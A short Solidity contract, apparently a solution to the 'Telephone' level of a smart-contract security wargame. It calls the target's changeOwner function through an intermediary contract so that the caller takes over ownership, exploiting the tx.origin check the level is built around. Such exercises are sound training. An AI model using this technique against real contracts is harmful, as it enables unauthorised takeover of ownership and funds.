// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '../levels/Telephone.sol';

contract TelephoneAttack {

    Telephone telephone;

    constructor(address _telephone) public {
        telephone = Telephone(_telephone);
    }

    function run() public {
        telephone.changeOwner(msg.sender);
    }
}
